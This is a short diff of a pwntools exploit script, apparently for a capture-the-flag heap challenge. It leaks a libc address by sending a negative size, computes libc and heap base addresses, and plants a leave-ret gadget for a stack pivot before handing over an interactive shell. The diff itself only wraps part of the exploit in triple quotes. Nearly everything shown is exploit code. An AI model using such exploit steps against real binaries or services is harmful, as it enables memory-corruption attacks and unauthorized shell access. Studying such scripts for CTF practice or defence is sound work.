@@ -29,7 +29,7 @@ menu(1)
 p.sendlineafter('size : ','-1');sleep(t)# strtok vulnablity : libc leak
 p.sendline('n');sleep(t);
 p.sendline('n');sleep(t);
-
+'''
 p.recvuntil('data : ')
 main_arena_96 = u64(p.recv(6).ljust(8,'\x00'))
 libc_base = main_arena_96 - 0x3ebca0
@@ -131,7 +131,7 @@ alloc(0x100,p64(leave_ret),'y',0x30,'n')
 p.sendlineafter('> ','1');sleep(t)
 p.sendlineafter(' : ',str(heap_base+2000))         # input size = rbp
 print(hex(heap_base + 2000))
-
+'''
 p.interactive()
 
 
